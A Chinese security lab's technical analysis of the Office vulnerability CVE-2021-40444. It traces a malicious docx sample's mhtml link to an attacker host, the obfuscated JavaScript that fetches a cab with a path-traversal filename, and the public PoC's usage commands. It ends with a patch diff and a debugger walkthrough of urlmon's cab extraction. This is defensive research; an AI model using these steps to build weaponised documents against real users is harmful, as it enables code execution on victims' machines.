**作者：sunglin@知道创宇404实验室**

 **前言:**  
随着cve-2021-40444的披露，随机引爆了全球的网络安全，虽然最近微软发布了补丁，但是cve-2021-40444的利用却越发猖狂，本人深入分析了这个漏洞。

## 0x00 0day样本分析

拿到样本的第一时间，便在自己的沙箱环境下面运行了下，并且从网上下载的docx，微软默认会开启保护模式，我这里是本地打开的，基本内容如下，全都是文字内容，基本上没发现什么:  
![image](https://image.3001.net/images/20210922/1632276077_614a8e6d6033113928e55.png!small)

![image](https://image.3001.net/images/20210922/1632276086_614a8e76662ce80ca4337.png!small)

但是在rels的document.xml文件中发现了链接Target="mhtml:http://hidusi.com/e273caf2ca371919/mountain.html!x-usc:<http://hidusi.com/e273caf2ca371919/mountain.html>"  
![image](https://image.3001.net/images/20210922/1632276132_614a8ea4a407334ee53e3.png!small)

![image](https://image.3001.net/images/20210922/1632276141_614a8ead2f26bc9aa882d.png!small)

可以发现其是指向文件的更新链接

![image](https://image.3001.net/images/20210922/1632276160_614a8ec0522ee6a0cc031.png!small)  
从样本库众获取到mountain.html后，我们打开一看，发现全部都混淆了，基本难辨真假，去混淆也比较简单

因为是js代码，随便找个网上去混淆的试试，比如<http://jsnice.org/>，将混淆的代码粘贴上去后，一键试下

![image](https://image.3001.net/images/20210922/1632276217_614a8ef9624e1a32994e3.png!small)

基本代码的轮廓就有了，它所有的字符串都会采用数组var a0_0x127f经过function a0_0x15ec进行拼接与置换

![image](https://image.3001.net/images/20210922/1632276237_614a8f0dc2b5b51444489.png!small)

这就很简单了，我通过普通脚本再一次去混淆：

![image](https://image.3001.net/images/20210922/1632276248_614a8f1880df56740898c.png!small)  
经过简单的静态分析与调试，基本上就是它会去请求服务器获取一个cab文件，并且会通过执行cpl文件去执行一个inf

然后通过样本库获取到这个cab，初步分析这个cab，发现了其解压路径是../championship.inf，并且标志cafile的大小是0x415c00，cab文件格式[1]对应如下

![image](https://image.3001.net/images/20210922/1632276292_614a8f4401e42d8392432.png!small)

![image](https://image.3001.net/images/20210922/1632276301_614a8f4d6f4a0454c19ae.png!small)

最后将恶意的url改成我们自己搭建的http server，之后成功复现样本攻击环境，并且捕捉到了样本通过rundll32执行了命令

![image](https://image.3001.net/images/20210922/1632276320_614a8f6041ada514eef4b.png!small)

## 0x01 cve-2021-40444漏洞的分析与利用

cve-2021-40444的poc很快公开在了github[2]上，poc的使用很简单,通过sudo python3 exploit.py host
80开启简单的http server服务器，python3 exploit.py generate test/calc.dll
ip生成包含有漏洞的docx：  
![image](https://image.3001.net/images/20210922/1632277575_614a944701620f207162c.png!small)

假如我们现在有一个正常的docx，可以通过以下添加稍加修改，就成了可以包含cve-2021-40444漏洞的docx了

![image](https://image.3001.net/images/20210922/1632277585_614a94512a867cb910dbb.png!small)

## 0x02 cve-2021-40444的补丁对比

通过ProcessMonitor监控我们可以获得其创建和读取cab文件的行为，其调用堆栈如下：

![image](https://image.3001.net/images/20210922/1632277731_614a94e33e4718ec7d780.png!small)

9月14号，微软发布了cve-2021-40444的补丁，经过补丁分析发现，urlmon.dll模块的catDirAndFile对路径验证做了修改,将'/'替换成了'\\\',防止路径遍历：

![image](https://image.3001.net/images/20210922/1632277750_614a94f64035ae3ea93e7.png!small)

![image](https://image.3001.net/images/20210922/1632277758_614a94fe8c02c0c64272e.png!small)

## 0x03漏洞调试

调试之前，我们首先了解下微软对cab文件的api处理如下<https://docs.microsoft.com/en-us/windows/win32/api/fdi/>：

![image](https://image.3001.net/images/20210922/1632278301_614a971d210ca91ed7823.png!small)

这些api包括了对cab文件的解析和读写操作等，urlmon模块通过调用cabinet模块中的这些api来处理cab文件的

首先docx触发get请求后会通过mshtml模块来处理，并且对cab文件的处理将会进入urlmon,之后在urlmon!GetSupportedInstallScopesFromFile这个api开始处理cab文件：

![image](https://image.3001.net/images/20210922/1632278315_614a972b7154677a91de0.png!small)

获取到C:\Users\l\AppData\Local\Microsoft\Windows\INetCache\IE\9FFFIV4G\word[1].cab先通过GetExtnAndBaseFileName去判断文件后缀名是不是cab：

![image](https://image.3001.net/images/20210922/1632278330_614a973aef12530954b91.png!small)

然后通过CreateUniqueCabTempDir创建临时文件夹，比如我这里是C:\Users\l\AppData\Local\Temp\Cab369A，进入api
ExtractInfFile后，将会继续调用Extract，在Extract将会第一次调用到FDICreate[3]和FDICopy[4],来获取cab的信息

![image](https://image.3001.net/images/20210922/1632278351_614a974f6c44def9612c7.png!small)  
FDICreate主要是对其他读写api等进行初始化操作：

![image](https://image.3001.net/images/20210922/1632278359_614a9757e056363dd0d92.png!small)  
而FDICopy主要就是提取cab文件的信息了

![image](https://image.3001.net/images/20210922/1632278370_614a9762a8be32a75dac3.png!small)  
进入CABINET!FDICopy后将会调用LoginCabinet来提取cab的0x24大小的head信息，比如包括对头部MSCF标志的判断：

![image](https://image.3001.net/images/20210922/1632278387_614a9773474887fd3ad0d.png!small)

之后将会进入CABINET!LoginCabinet、CABINET!FDICallEnumerate分别对应信息FNFDINOTIFY的fdintCABINET_INFO、fdintENUMERATE，再一次进入urlmon!fdiNotifyExtract后获取CFFILE
file的信息，而对应的标志是0x02：

![image](https://image.3001.net/images/20210922/1632278397_614a977d344cde6ba4e1b.png!small)

获取到初始化结构体后将会在urlmon!ExtractInfFile调用urlmon!ExtractOneFile：

![image](https://image.3001.net/images/20210922/1632278406_614a97863ff0636c0edb2.png!small)

而在urlmon!ExtractOneFile中将会给(a4+0x202)赋值结构体lpsz，将会确保在调用urlmon!NeedFile成功返回：

![image](https://image.3001.net/images/20210922/1632278428_614a979c727a4aea22a09.png!small)  
之后将会继续以标志fdintCOPY_FILE(0x02)继续调用urlmon!fdiNotifyExtract，继续调用urlmon!catDirAndFile继续路径字符串格式化，而我们传入的inf路径是C:\Users\l\AppData\Local\Temp\Cab45F3../msword.inf

![image](https://image.3001.net/images/20210922/1632278439_614a97a746c3ace0a0a72.png!small)  
最后退出urlmon!catDirAndFile将会在urlmon!fdiNotifyExtract中调用Win32Open：  
![image](https://image.3001.net/images/20210922/1632278450_614a97b2618fb0feecaf2.png!small)  
而在Win32Open中将会调用CreateFileA，以路径C:\Users\l\AppData\Local\Temp\Cab45F3../msword.inf创建文件msword.inf，因为路径存在目录遍历问题，所有将会在C:\Users\l\AppData\Local\Temp\msword.inf创建文件：

![image](https://image.3001.net/images/20210922/1632278467_614a97c31c586218d2840.png!small)  
成功创建msword.inf文件后将会继续成功调用CABINET!FDIGetFile，在CABINET!FDIGetFile中将会以第一个CFDATA
data大小数据写入到文件中，之后caFile(实际为解压文件大小)将会减去写入的CFDATA
data大小，接着进行比较直到将所有的caFile大小写入，而这里我们的caFile大小是0x415c0000,远远大于实际的CFDATA的总大小，所以将会在调用最后一次CABINET!FDIGetDataBlock获取块的时候失败并退出：

![image](https://image.3001.net/images/20210922/1632278477_614a97cd996a6d000108a.png!small)  
虽然退出了，但不影响实际写入文件的数据，并且因为这个失败将不会在urlmon!DeleteExtractedFiles调用DeleteFileA,因为v2[2]的标志未清0，所以不会删除临时文件，从而我们创建的msword.inf得以保存，并且在后续中可以直接以cpl文件去运行C:\Users\l\AppData\Local\Temp\msword.inf

![image](https://image.3001.net/images/20210922/1632278487_614a97d754f3b2e54e5cf.png!small)

而正常的提取cab文件将会以标志fdintCLOSE_FILE_INFO(0x03)进入，调用urlmon!MarkExtracted，将标志清0：

![image](https://image.3001.net/images/20210922/1632278514_614a97f2de86d21a3b160.png!small)

至此，从获取到cab文件到提取解析，并且触发目录遍历漏洞过程分析完毕。

而网上有大佬有公布以最简洁的方式触发了[5]这个漏洞，并且可以在ie中复现成功。  
![image](https://image.3001.net/images/20210922/1632278525_614a97fd23a3609e96cc1.png!small)

## 0x04 漏洞防范

对网上来路不明的docx,请不要随意点击,更新最新的微软补丁

## 0x05参考链接：

[1]<http://hmelnov.icc.ru/geos/scripts/WWWBinV.dll/ShowR?cab.rfh>

[2]<https://github.com/lockedbyte/CVE-2021-40444>

[3]<https://docs.microsoft.com/en-us/windows/win32/api/fdi/nf-fdi-fdicreate>

[4]<https://docs.microsoft.com/en-us/windows/win32/api/fdi/nf-fdi-fdicopy>

[5]<https://twitter.com/j00sean/status/1437390861499838466>

